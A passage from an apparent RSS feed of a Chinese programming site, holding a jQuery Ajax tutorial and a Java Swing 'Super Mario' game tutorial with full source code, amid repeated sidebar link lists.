在卸载之前…阅读更多...【MySQL】InnoDB存储引擎中的锁实现事务隔离级别的过程中用到了锁&amp;#xff0c;所谓锁就是在事务A修改某些数据时&amp;#xff0c;对这些数据加一把锁&amp;#xff0c;防止其他事务同时对这些数据执行修改操作;当事务A完成修改操作后&amp;#xff0c;释放当前持有的锁&amp;#xff0c;以便其他事务再次上锁执行对应的操作。不同…阅读更多...10月18日，每日信息差第一、现代汽车集团在上海举办了中国前瞻技术研发中心的发布及启新庆典&amp;#xff0c;宣布成立其全资法人公司 —— 现代前瞻汽车技术开发&amp;#xff08;上海&amp;#xff09;有限公司。该中心是集团在海外建立的首个前瞻技术研发中心&amp;#xff0c;专注于自动驾驶、智能座舱、共享出行等…阅读更多...23种设计模式具体实现方法提示&amp;#xff1a;文章 文章目录 前言一、背景二、设计模式1、代理模式2、适配器模式2.1 总结 三、3.1 总结 前言 
前期疑问&amp;#xff1a; 本文目标&amp;#xff1a; 一、背景 
最近 
二、设计模式 
1、代理模式 
参考的这篇文章&amp;#xff0c;代理模式(Proxy) 
同时这篇文章还引用了另…阅读更多...嵌入式数据结构中顺序栈用法第一：嵌入式C语言中栈特点 栈是限制在一端进行插入操作和删除操作的线性表（俗称堆栈），允许进行操作的一端称为“栈顶”，另一固定端称为“栈底”，当栈中没有元素时称为“空栈”。特点 ：后进先出（LIFO）。阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:59 +0000</pubDate>
    </item>
    <item>
      <title>jQuery 中的 Ajax 详解</title>
      <link>https://www.ppmy.cn/news/1540356.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维jQuery 中的 Ajax 详解news/2025/10/31 17:52:58/一、概念众所周知，jQuery 是一个跨主流浏览器的 JavaScript 库，它封装了 JavaScript 的常用功能代码，简化了 HTML DOM 操作、事件处理、动画设计和 Ajax 交互等任务。jQuery 中的 Ajax 是对 XMLHttpRequest 或 ActiveXObject（IE9以下版本中）的封装，它提供了一种更加方便和强大的方式来与服务器进行数据交换，从而实现在不重新加载整个页面的情况下，对网页进行局部更新。二、jQuery 发送 GET 请求//$.ajax() 等同于 jQuery.ajax()，是 jQuery 提供的一个全局函数，用于发送 Ajax 请求。//该函数接受一个配置对象作为参数，这个对象可以包含各种属性和方法，用于定义 Ajax 请求的不同方面。$.ajax({//属性 type 用于指定请求类型（GET/POST），默认为 GET，其它 HTTP 请求方法仅部分浏览器支持。type: 'GET',//属性 url 用于指定请求地址。url: 'http://127.0.0.1:8080/getData',//属性 data 用于指定发送到服务器的数据，GET请求时 data 属性值将自动转换为查询字符串格式并附加在 URL 后。//如果 value 为数组，jQuery 将自动为不同值对应同一个名称，如 {foo:["bar1", "bar2"]} 转换为 "&amp;foo=bar1&amp;foo=bar2"。data: {param1:value1, param2:value2},//方法 success(data, textStatus, jqXHR) 用于指定请求成功后的回调，其中参数 data 表示服务器的响应体信息；//textStatus 表示请求的状态，对于成功的请求，值通常是"success"；//jqXHR 是 jQuery 对原生 XMLHttpRequest 对象的封装和扩展，提供了更多的方法和属性来处理 HTTP 请求。success: function(data,textStatus,jqXHR){//XMLHttpRequest 对象的属性 status，用于表示服务器响应的 HTTP 状态码，如200表示成功，404表示未找到等。console.log(jqXHR.status);//XMLHttpRequest 对象的属性 statusText，用于表示服务器响应的状态描述，如"OK"、"Not Found"等。console.log(jqXHR.statusText);//XMLHttpRequest 对象的方法getAllResponseHeaders()，以一个字符串形式返回所有的响应头，且每个响应头独占一行。console.log(jqXHR.getAllResponseHeaders());//参数 data 表示服务器的响应体信息。console.log(data);//XMLHttpRequest 对象的属性 responseType，用于表示服务器响应体的数据类型，"" (默认值)表示字符串、text 表示字符串、//arraybuffer 表示 ArrayBuffer 对象、blob 表示 Blob 对象、document 表示 Document 对象(XML/HTML)、json 表示 JSON 对象。console.log(jqXHR.responseType);},//属性 timeout 用于指定当前请求的最大请求时间，单位为毫秒，如果请求在该时间内未结束则会自动终止，同时执行 error 指定的回调。timeout: 2000,//方法 error(jqXHR, textStatus) 用于指定请求失败时的回调，//其中参数 jqXHR 是 jQuery 对原生 XMLHttpRequest 对象的封装和扩展，提供了更多的方法和属性来处理 HTTP 请求；//textStatus 表示请求的状态，对于失败的请求，值通常是"timeout"(请求超时)、"error"(请求未能成功完成)、"abort"(请求被中止)、//"parsererror"(解析返回的数据时出错)等。error: function(jqXHR,textStatus){console.log("请求失败，请稍后重试!");}
})三、jQuery 发送 POST 请求$.ajax({type: 'POST',url: 'http://127.0.0.1:8080/saveData',//属性 contentType 用于告诉服务器请求体的数据类型是什么，默认值为 application/x-www-form-urlencoded，//application/json 表示请求体是 JSON 格式的数据，application/x-www-form-urlencoded 表示请求体是表单数据。//contentType: 'application/json; charset=utf-8',//属性 processData 用于指定 data 属性值是否需要自动转换，默认为 true。//processData: false,//属性 data 用于指定发送到服务器的数据，类型可以是 Key/Value 对、JSON 字符串、FromData 对象等，//此时此处 data 属性值将自动转换为表单数据格式并放在请求体中。data: {param1:value1, param2:value2},//JavaScript 内置对象 JSON 的方法stringify()，用于将 JavaScript 对象转换成 JSON 格式的字符串。//data: JSON.stringify({ param1:value1,param2:value2 }),success: function(data,textStatus,jqXHR){//假设响应体为 JSON 格式的字符串，此时可以通过 JavaScript 内置对象JSON的方法parse()将其转换成 JavaScript 对象。console.log(JSON.parse(data));},timeout: 2000,error: function(jqXHR,textStatus){console.log("请求失败，请稍后重试!");}
})四、$.ajax() 方法1、含义$.ajax(url,[settings]) 等同于 jQuery.ajax(url,[settings])，是 jQuery 提供的一个全局函数，用于发送 Ajax 请求。该函数接受一个配置对象作为参数，这个对象可以包含各种属性和方法，用于定义 Ajax 请求的不同方面。2、settings 选项① type 属性含义：用于指定请求类型（GET/POST），默认为 GET。说明：其它 HTTP 请求方法，如 PUT 和 DELETE 也可以使用，但仅部分浏览器支持。② async 属性含义：用于指定请求方式，true 表示异步请求(默认值)，false 表示同步请求。说明：同步请求将锁住浏览器，用户其它操作必须等待请求完成才可以执行。③ headers 属性含义：用于设置请求头，值为一个对象"{键:值}"，其中键是请求头的名称、值是请求头的值。说明：它允许向服务器发送额外的 HTTP 请求头，比如认证令牌、客户端类型、内容类型等，从而进行相应的处理。④ contentType 属性含义：用于告诉服务器请求体的数据类型是什么，默认值为 application/x-www-form-urlencoded。说明：application/json 表示请求体是 JSON 格式的数据，application/x-www-form-urlencoded 表示请求体是表单数据。⑤ processData 属性含义：用于指示 jQuery 是否应该自动将传入的数据（通过 data 配置项指定的）转换为查询字符串（对于 GET 请求）或发送为表单数据（对于 POST 请求），默认值为 true。说明：当向服务器发送原始数据（ JSON 数据、FormData 对象、Blob 或 ArrayBuffer 等二进制数据）时，应该将 processData 设置为 false。⑥ data 属性含义：用于指定发送到服务器的数据，类型可以是 Key/Value 对、JSON 字符串、FromData 对象等。说明：数据类型为 Key/Value 对且 Value 为数组时，jQuery 将自动为不同值对应同一个名称，如 {foo:["bar1", "bar2"]} 将转换为 "&amp;foo=bar1&amp;foo=bar2"。⑦ timeout 属性含义：用于指定当前请求的最大请求时间，单位为毫秒。说明：如果请求在该时间内未结束则会自动终止，同时执行 error 指定的回调。⑧ beforeSend(jqXHR) 方法含义：用于指定请求发送前的回调，若返回 false，则请求将被取消。说明：它允许在请求发送前执行一些操作，比如设置请求头、修改发送的数据、根据某些条件取消请求等；其中参数 jqXHR 是 jQuery 对原生 XMLHttpRequest 对象的封装和扩展，提供了更多的方法和属性来处理 HTTP 请求。⑨ success(data, textStatus, jqXHR) 方法含义：用于指定请求成功后的回调。说明：参数 data 表示服务器的响应体信息；textStatus 表示请求的状态，对于成功的请求，值通常是"success"；jqXHR 是 jQuery 对原生 XMLHttpRequest 对象的封装和扩展，提供了更多的方法和属性来处理 HTTP 请求。⑩ error(jqXHR, textStatus) 方法含义：用于指定请求失败时的回调。说明：参数 jqXHR 是 jQuery 对原生 XMLHttpRequest 对象的封装和扩展，提供了更多的方法和属性来处理 HTTP 请求；textStatus 表示请求的状态，对于失败的请求，值通常是"timeout"(请求超时)、"error"(请求未能成功完成)、"abort"(请求被中止)、"parsererror"(解析返回的数据时出错)等。⑪ complete(jqXHR, textStatus) 方法含义：用于指定请求完成后（无论成功或失败）的回调。说明：它允许执行一些在请求结束后始终需要执行的代码，比如隐藏加载动画、清理资源等；其中参数 jqXHR 是 jQuery 对原生 XMLHttpRequest 对象的封装和扩展，提供了更多的方法和属性来处理 HTTP 请求；textStatus 表示请求的状态，值通常是"success"(请求成功完成)、"timeout"(请求超时)、"error"(请求未能成功完成)、"abort"(请求被中止)、"parsererror"(解析返回的数据时出错)等。五、扩展知识在早期的 jQuery 版本中，$.ajax() 函数返回其创建的 XMLHttpRequest 对象。然而，自 jQuery 1.5 开始，jQuery 团队在这个 jqXHR 对象的基础上，添加了对 Promise 接口的实现。这意味着，$.ajax() 函数现在返回的 jqXHR 对象同时拥有 XMLHttpRequest 对象的所有属性和方法，以及 Promise 接口提供的一系列新方法。Promise 提供了三个核心方法 .then()、.catch()、.finally()，用于处理异步操作的结果。其中，方法 .then() 用于指定 Promise 成功后或失败时的回调；.catch() 用于指定 Promise 失败时的回调；.finally() 用于指定无论 Promise 最终状态如何都会执行的回调。然而，jQuery 为了提供更符合其使用习惯的 API，在实现 Promise 接口的基础上，额外定义了 .done()、.fail()、.always() 方法。这些方法提供了与 .then()、.catch()、.finally() 类似的功能，但具有更明确的语义，使得代码在处理成功、失败和最终完成时的逻辑更加清晰。$.ajax({type: 'POST',url: 'http://127.0.0.1:8080/saveData',//属性 contentType 用于告诉服务器请求体的数据类型是什么，默认值为 application/x-www-form-urlencoded，//application/json 表示请求体是 JSON 格式的数据，application/x-www-form-urlencoded 表示请求体是表单数据。contentType: 'application/json; charset=utf-8',//属性 processData 用于指定 data 属性值是否需要自动转换，默认为 true。processData: false,//属性 data 用于指定发送到服务器的数据，类型可以是 Key/Value 对、JSON 字符串、FromData 对象等，//JavaScript 内置对象 JSON 的方法stringify()，用于将 JavaScript 对象转换成 JSON 格式的字符串。data: JSON.stringify({ param1:value1,param2:value2 }),timeout: 2000
})
.done(function(data,textStatus,jqXHR){ //用于指定请求成功后的回调。console.log(data);
})
.fail(function(jqXHR,textStatus){ //用于指定请求失败时的回调。console.log("请求失败，请稍后重试!");
})
.always(function(jqXHR, textStatus){ //用于指定请求完成后（无论成功或失败）的回调。console.log(jqXHR.response);
})值得注意的时，虽然 jQuery 的这些方法提供了便利，但在现代的 JavaScript 开发中，直接使用原生的 Promise 接口和 async/await 语法已经成为主流。这些现代 JavaScript 特性提供了更加强大和灵活的异步编程能力，同时保持了代码的简洁性和可读性。因此，对于新的开发项目，建议优先考虑使用原生的 Promise 接口和 async/await 语法。http://www.ppmy.cn/news/1540356.html相关文章Java 小游戏《超级马里奥》文章目录 一、效果展示二、代码编写1. 素材准备2. 创建窗口类3. 创建常量类4. 创建动作类5. 创建关卡类6. 创建障碍物类7. 创建马里奥类8. 编写程序入口 一、效果展示 二、代码编写 
1. 素材准备 
首先创建一个基本的 java 项目&amp;#xff0c;并将本游戏需要用到的图片素材 image…阅读更多...智能体网络时代即将来临，我们需要新的连接技术备注&amp;#xff1a;如果你也对这个话题感兴趣&amp;#xff0c;欢迎联系我们&amp;#xff1a; email: chgaoweigmail.com  Discord: https://discord.gg/CDYdTPXXMB  官网: https://pi-unlimited.com  
我们的方案代码已经开源&amp;#xff0c;github&amp;#xff1a;https://github.com/chgaowei/…阅读更多...Ubuntu卸载Mysql【ubuntu 24.04/mysql 8.0.39】一、准备工作 
查看ubuntu版本号  查看mysql版本号(如果没有安装mysql,这一步省略)  
二、Ubuntu上卸载mysql(如果没有安装mysql这一步省略) 
在Ubuntu上卸载MySQL可以通过以下步骤进行&amp;#xff0c;确保完全移除MySQL相关的包和数据&amp;#xff1a; 
1. 停止MySQL服务 
在卸载之前…阅读更多...【MySQL】InnoDB存储引擎中的锁实现事务隔离级别的过程中用到了锁&amp;#xff0c;所谓锁就是在事务A修改某些数据时&amp;#xff0c;对这些数据加一把锁&amp;#xff0c;防止其他事务同时对这些数据执行修改操作;当事务A完成修改操作后&amp;#xff0c;释放当前持有的锁&amp;#xff0c;以便其他事务再次上锁执行对应的操作。不同…阅读更多...10月18日，每日信息差第一、现代汽车集团在上海举办了中国前瞻技术研发中心的发布及启新庆典&amp;#xff0c;宣布成立其全资法人公司 —— 现代前瞻汽车技术开发&amp;#xff08;上海&amp;#xff09;有限公司。该中心是集团在海外建立的首个前瞻技术研发中心&amp;#xff0c;专注于自动驾驶、智能座舱、共享出行等…阅读更多...23种设计模式具体实现方法提示&amp;#xff1a;文章 文章目录 前言一、背景二、设计模式1、代理模式2、适配器模式2.1 总结 三、3.1 总结 前言 
前期疑问&amp;#xff1a; 本文目标&amp;#xff1a; 一、背景 
最近 
二、设计模式 
1、代理模式 
参考的这篇文章&amp;#xff0c;代理模式(Proxy) 
同时这篇文章还引用了另…阅读更多...嵌入式数据结构中顺序栈用法第一：嵌入式C语言中栈特点 栈是限制在一端进行插入操作和删除操作的线性表（俗称堆栈），允许进行操作的一端称为“栈顶”，另一固定端称为“栈底”，当栈中没有元素时称为“空栈”。特点 ：后进先出（LIFO）。阅读更多...机器学习：opencv--人脸检测以及微笑检测目录 
前言 
一、人脸检测的原理 
1.特征提取 
2.分类器 
二、代码实现 
1.图片预处理 
2.加载分类器 
3.进行人脸识别 
4.标注人脸及显示 
三、微笑检测 前言 人脸检测是计算机视觉中的一个重要任务&amp;#xff0c;旨在自动识别图像或视频中的人脸。它可以用于多种应用&amp;#xff0…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:58 +0000</pubDate>
    </item>
    <item>
      <title>Java 小游戏《超级马里奥》</title>
      <link>https://www.ppmy.cn/news/1540355.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Java 小游戏《超级马里奥》news/2025/10/31 17:52:57/文章目录一、效果展示二、代码编写1. 素材准备2. 创建窗口类3. 创建常量类4. 创建动作类5. 创建关卡类6. 创建障碍物类7. 创建马里奥类8. 编写程序入口一、效果展示二、代码编写1. 素材准备首先创建一个基本的 java 项目，并将本游戏需要用到的图片素材 image 导入。图片素材如下：https://pan.baidu.com/s/1db_IcPvPKWKbVPtodPWO5Q?pwd=03kv提取码：03kv2. 创建窗口类① Java 内部已经给我们封装了窗口的各种方法，我们只需创建一个窗口类并重写父类的方法，即可使用；② Alt + Enter 键 → implement methods 可一键补全所有的重写方法；③ 实现多线程有两种方法，分别是继承 Thread 类和实现 Runnable 接口，这里我们用 Runnable 方法，因为 Java 不支持多继承。重写 paint 方法，实现场景、物体的绘制，使用多线程无限绘制窗口。完整代码如下：packagecom.zxe.beans;importjavax.swing.*;importjava.awt.*;importjava.awt.event.KeyEvent;importjava.awt.event.KeyListener;importjava.util.ArrayList;importjava.util.List;/*** 窗口类*/publicclassMyFrameextendsJFrameimplementsKeyListener,Runnable{//定义一个集合用于所有的关卡privateList&lt;LevelMap&gt;levelMaps=newArrayList&lt;&gt;();//定义一个变量，存放当前背景privateLevelMaplevelMap=newLevelMap();//定义变量，记录马里奥privateMariomario;//重写paint方法，实现场景、物体的绘制@Overridepublicvoidpaint(Graphicsg){//创建一张图片Imageimage=createImage(1045,500);//设置图片Graphicsgraphics=image.getGraphics();graphics.drawImage(levelMap.getBg(),0,0,1045,500,this);//绘制障碍物for(Obstacleobstacle:levelMap.getObstacles()){graphics.drawImage(obstacle.getObstacleImage(),obstacle.getX(),obstacle.getY(),this);}//绘制马里奥graphics.drawImage(mario.getMarioImage(),mario.getX(),mario.getY(),this);//将图片描绘到当前窗口中g.drawImage(image,0,0,this);}@OverridepublicvoidkeyTyped(KeyEvente){}@OverridepublicvoidkeyPressed(KeyEvente){if(e.getKeyCode()==37){mario.runLeft();}elseif(e.getKeyCode()==39){mario.runRight();}elseif(e.getKeyCode()==38){mario.jump();}}publicMariogetMario(){returnmario;}publicvoidsetMario(Mariomario){this.mario=mario;}@OverridepublicvoidkeyReleased(KeyEvente){if(e.getKeyCode()==37){mario.runLeftStop();}elseif(e.getKeyCode()==39){mario.runRightStop();}elseif(e.getKeyCode()==38){mario.jumpDown();}}@Overridepublicvoidrun(){//无限次绘制马里奥while(true){repaint();try{Thread.sleep(50);}catch(InterruptedExceptione){thrownewRuntimeException(e);}//判断一下马里奥是否通关if(mario.getX()&gt;1040){levelMap=levelMaps.get(levelMap.getLevel());mario.setLevelMap(levelMap);mario.setX(50);mario.setY(420);}}}publicList&lt;LevelMap&gt;getLevelMaps(){returnlevelMaps;}publicvoidsetLevelMaps(List&lt;LevelMap&gt;levelMaps){this.levelMaps=levelMaps;}publicLevelMapgetLevelMap(){returnlevelMap;}publicvoidsetLevelMap(LevelMaplevelMap){this.levelMap=levelMap;}}3. 创建常量类小游戏中的各种元素画面其实都是一张张的图片，而这些图片路径的定义都将放在常量类中完成。packagecom.zxe.beans;importjavax.imageio.ImageIO;importjava.awt.image.BufferedImage;importjava.io.File;importjava.io.IOException;importjava.util.ArrayList;importjava.util.List;/*** 常量类*/publicclassConstant{//给窗口定义一张图片publicstaticBufferedImagebg;//右跳图片publicstaticBufferedImagejumpR;//左跳图片publicstaticBufferedImagejumpL;//右边站立publicstaticBufferedImagestandR;//左边站立publicstaticBufferedImagestandL;//定义一个集合，存放右跑动作publicstaticList&lt;BufferedImage&gt;runR=newArrayList&lt;&gt;();//定义一个集合，存放左跑动作publicstaticList&lt;BufferedImage&gt;runL=newArrayList&lt;&gt;();//为障碍物定义一个集合publicstaticList&lt;BufferedImage&gt;onstacles=newArrayList&lt;&gt;();//定义一个变量，记录文件路径前缀publicstaticStringprefix="C:\\Users\\Lenovo\\Desktop\\demo\\file\\image\\";//初始化图片到系统中publicstaticvoidinitImage(){try{//加载图片bg=ImageIO.read(newFile(prefix+"bg2.jpeg"));jumpR=ImageIO.read(newFile(prefix+"mario_jump_r.png"));jumpL=ImageIO.read(newFile(prefix+"mario_jump_l.png"));standR=ImageIO.read(newFile(prefix+"mario_stand_r.png"));standL=ImageIO.read(newFile(prefix+"mario_stand_l.png"));runR.add(ImageIO.read(newFile(prefix+"mario_run_r1.png")));runR.add(ImageIO.read(newFile(prefix+"mario_run_r2.png")));runL.add(ImageIO.read(newFile(prefix+"mario_run_l1.png")));runL.add(ImageIO.read(newFile(prefix+"mario_run_l2.png")));for(inti=1;i&lt;=6;i++){onstacles.add(ImageIO.read(newFile(prefix+"ob"+i+".png")));}}catch(IOExceptione){e.printStackTrace();thrownewRuntimeException(e);}}}常量用 static 修饰，外部可直接通过类名调用常量，而无需创建对象。4. 创建动作类记录玛丽的动作状态，具体的常量名与代码分离，可以降低代码的耦合度，更规范化。5. 创建关卡类每个关卡的障碍物是不一样的，这里需要外部传入关卡号，在关卡类中把不同的障碍物拼成自定义的关卡。完整代码如下：packagecom.zxe.beans;importcom.zxe.utils.Constant;importjava.awt.image.BufferedImage;importjava.util.ArrayList;importjava.util.List;/*** 关卡地图类*/publicclassLevelMap{//记录当前场景需要的图片privateBufferedImagebg;//记录当前关卡privateintlevel;//创建一个集合，用于存放障碍物privateList&lt;Obstacle&gt;obstacles=newArrayList&lt;&gt;();publicLevelMap(){}publicLevelMap(intlevel){this.level=level;bg=Constant.bg;if(level==1){//绘制方块obstacles.add(newObstacle(100,370,0,this));obstacles.add(newObstacle(130,370,1,this));obstacles.add(newObstacle(160,370,0,this));obstacles.add(newObstacle(190,370,1,this));obstacles.add(newObstacle(300,260,0,this));obstacles.add(newObstacle(330,260,1,this));obstacles.add(newObstacle(360,260,1,this));obstacles.add(newObstacle(800,300,0,this));obstacles.add(newObstacle(830,300,0,this));obstacles.add(newObstacle(860,300,1,this));obstacles.add(newObstacle(890,300,1,this));//绘制水管obstacles.add(newObstacle(420,420,4,this));obstacles.add(newObstacle(450,420,5,this));obstacles.add(newObstacle(415,390,2,this));obstacles.add(newObstacle(435,390,2,this));obstacles.add(newObstacle(455,390,3,this));obstacles.add(newObstacle(600,420,4,this));obstacles.add(newObstacle(630,420,5,this));obstacles.add(newObstacle(600,390,4,this));obstacles.add(newObstacle(630,390,5,this));obstacles.add(newObstacle(595,360,2,this));obstacles.add(newObstacle(615,360,2,this));obstacles.add(newObstacle(635,360,3,this));}elseif(level==2){inti=0;for(inty=420;y&gt;=300;y-=30){for(intx=100;x&lt;=190-30*i;x+=30){obstacles.add(newObstacle(x+30*i,y,0,this));}for(intx=300;x&lt;=390-30*i;x+=30){obstacles.add(newObstacle(x,y,0,this));}for(intx=550;x&lt;=640-30*i;x+=30){obstacles.add(newObstacle(x+30*i,y,0,this));}for(intx=670;x&lt;=790-30*i;x+=30){obstacles.add(newObstacle(x,y,0,this));}i++;}}}publicBufferedImagegetBg(){returnbg;}publicvoidsetBg(BufferedImagebg){this.bg=bg;}publicintgetLevel(){returnlevel;}publicvoidsetLevel(intlevel){this.level=level;}publicList&lt;Obstacle&gt;getObstacles(){returnobstacles;}publicvoidsetObstacles(List&lt;Obstacle&gt;obstacles){this.obstacles=obstacles;}}6. 创建障碍物类障碍物的属性包括图片以及横纵坐标。完整代码如下：packagecom.zxe.beans;importcom.zxe.utils.Constant;importjava.awt.image.BufferedImage;/*** 障碍物类*/publicclassObstacle{//记录障碍物的坐标privateintx;privateinty;//定义一个变量，记录当前障碍物的图片信息privateBufferedImageobstacleImage;//定义障碍物类型privateinttype;//定义变量存放当前的背景privateLevelMapbg;publicObstacle(intx,inty,inttype,LevelMapbg){this.x=x;this.y=y;this.type=type;this.bg=bg;//根据障碍物的编号，从常量中的障碍物集合中获取对应的图片this.obstacleImage=Constant.onstacles.get(type);}publicintgetX(){returnx;}publicvoidsetX(intx){this.x=x;}publicintgetY(){returny;}publicvoidsetY(inty){this.y=y;}publicBufferedImagegetObstacleImage(){returnobstacleImage;}publicvoidsetObstacleImage(BufferedImageobstacleImage){this.obstacleImage=obstacleImage;}publicintgetType(){returntype;}publicvoidsetType(inttype){this.type=type;}publicLevelMapgetBg(){returnbg;}publicvoidsetBg(LevelMapbg){this.bg=bg;}}7. 创建马里奥类马里奥的无限行走动作由多线程实现，定义一个状态量status，用于标记马里奥当前的运动状态，以便进行不同动作的来回切换。完整代码如下：packagecom.zxe.beans;importcom.zxe.utils.Action;importcom.zxe.utils.Constant;importjava.awt.image.BufferedImage;/*** 马里奥类*/publicclassMarioimplementsRunnable{//记录马里奥坐标信息privateintx;privateinty;//记录马里奥状态privateStringstatus;//定义一个变量，记录马里奥当前动作所对应的图片信息privateBufferedImagemarioImage;//定义变量，记录当前的关卡地图，也可以获取障碍物的信息privateLevelMaplevelMap=newLevelMap();//创建线程执行马里奥的动作privateThreadthread;//定义变量，记录马里奥的移动速度privateintxSpeed;//定义变量，记录马里奥的跳跃速度privateintySpeed;//定义变量，记录马里奥的上升状态privateintup;publicMario(){}publicMario(intx,inty){this.x=x;this.y=y;//默认马里奥的动作是朝右站立status=Action.STAND_RIGHT;marioImage=Constant.standR;thread=newThread(this);thread.start();}//马里奥向左移动的方法publicvoidrunLeft(){//判断当前是否为跳跃状态，如果不是，就改变状态if(!status.contains("jump")){status=Action.RUN_LEFT;}else{status=Action.JUMP_LEFT;}xSpeed=-5;}//马里奥向右移动的方法publicvoidrunRight(){//判断当前是否为跳跃状态，如果不是，就改变状态if(!status.contains("jump")){status=Action.RUN_RIGHT;}else{status=Action.JUMP_RIGHT;}xSpeed=5;}publicvoidjump(){if(status.contains("left")){status=Action.JUMP_LEFT;}else{status=Action.JUMP_RIGHT;}ySpeed=-12;}publicvoidjumpDown(){ySpeed=12;}privatevoidjumpStop(){if(status.contains("left")){status=Action.STAND_LEFT;}else{status=Action.STAND_RIGHT;}ySpeed=0;}//马里奥向左移动停止的方法publicvoidrunLeftStop(){if(!status.contains("jump")){status=Action.STAND_LEFT;}else{status=Action.JUMP_LEFT;}xSpeed=0;}//马里奥向右移动停止的方法publicvoidrunRightStop(){if(!status.contains("jump")){status=Action.STAND_RIGHT;}else{status=Action.JUMP_RIGHT;}xSpeed=0;}publicintgetX(){returnx;}publicvoidsetX(intx){this.x=x;}publicintgetY(){returny;}publicvoidsetY(inty){this.y=y;}publicStringgetStatus(){returnstatus;}publicvoidsetStatus(Stringstatus){this.status=status;}publicBufferedImagegetMarioImage(){returnmarioImage;}publicvoidsetMarioImage(BufferedImagemarioImage){this.marioImage=marioImage;}publicLevelMapgetLevelMap(){returnlevelMap;}publicvoidsetLevelMap(LevelMaplevelMap){this.levelMap=levelMap;}publicThreadgetThread(){returnthread;}publicvoidsetThread(Threadthread){this.thread=thread;}publicintgetxSpeed(){returnxSpeed;}publicvoidsetxSpeed(intxSpeed){this.xSpeed=xSpeed;}publicintgetySpeed(){returnySpeed;}publicvoidsetySpeed(intySpeed){this.ySpeed=ySpeed;}publicintgetUp(){returnup;}publicvoidsetUp(intup){this.up=up;}@Overridepublicvoidrun(){intindex=0;//控制马里奥无限移动while(true){//判断当前是否移动，xSpeed&lt;0左移动，xSpeed&gt;0右移动if(xSpeed&lt;0||xSpeed&gt;0){x+=xSpeed;if(x&lt;0){x=0;}}if(ySpeed&lt;0||ySpeed&gt;0){y+=ySpeed;if(y&gt;420){y=420;jumpStop();}if(y&lt;280){y=280;}}//判断移动状态，跑步状态图片切换if(status.contains("run")){index=index==0?1:0;}//根据马里奥的状态切换不同的图片if(Action.RUN_LEFT.equals(status)){marioImage=Constant.runL.get(index);}if(Action.RUN_RIGHT.equals(status)){marioImage=Constant.runR.get(index);}if(Action.STAND_LEFT.equals(status)){marioImage=Constant.standL;}if(Action.STAND_RIGHT.equals(status)){marioImage=Constant.standR;}if(Action.JUMP_LEFT.equals(status)){marioImage=Constant.jumpL;}if(Action.JUMP_RIGHT.equals(status)){marioImage=Constant.jumpR;}// 控制线程的速度try{Thread.sleep(30);}catch(InterruptedExceptione){thrownewRuntimeException(e);}}}}8. 编写程序入口创建游戏窗口，并对窗口的基本属性进行设置，创建三个关卡，并调用 repaint 方法绘制场景。packagecom.zxe;importcom.zxe.beans.LevelMap;importcom.zxe.beans.Mario;importcom.zxe.utils.Constant;importcom.zxe.beans.MyFrame;importjavax.swing.*;publicclassMain{publicstaticvoidmain(String[]args){//创建窗口对象MyFramemyFrame=newMyFrame();//设置窗口大小myFrame.setSize(1045,500);//设置窗口居中myFrame.setLocationRelativeTo(null);//设置窗口可见性myFrame.setVisible(true);//设置窗口关闭程序myFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);//设置键盘监听事件myFrame.addKeyListener(myFrame);//设置窗口的大小不可改变myFrame.setResizable(false);//设置窗口标题myFrame.setTitle("超级玛丽");//加载图片Constant.initImage();//创建三个关卡地图for(inti=1;i&lt;=3;i++){myFrame.getLevelMaps().add(newLevelMap(i));}//设置当前关卡地图myFrame.setLevelMap(myFrame.getLevelMaps().get(0));//创建马里奥Mariomario=newMario(50,420);myFrame.setMario(mario);mario.setLevelMap(myFrame.getLevelMap());//绘制场景myFrame.repaint();Threadthread=newThread(myFrame);thread.start();}}http://www.ppmy.cn/news/1540355.html相关文章智能体网络时代即将来临，我们需要新的连接技术备注&amp;#xff1a;如果你也对这个话题感兴趣&amp;#xff0c;欢迎联系我们&amp;#xff1a; email: chgaoweigmail.com  Discord: https://discord.gg/CDYdTPXXMB  官网: https://pi-unlimited.com  
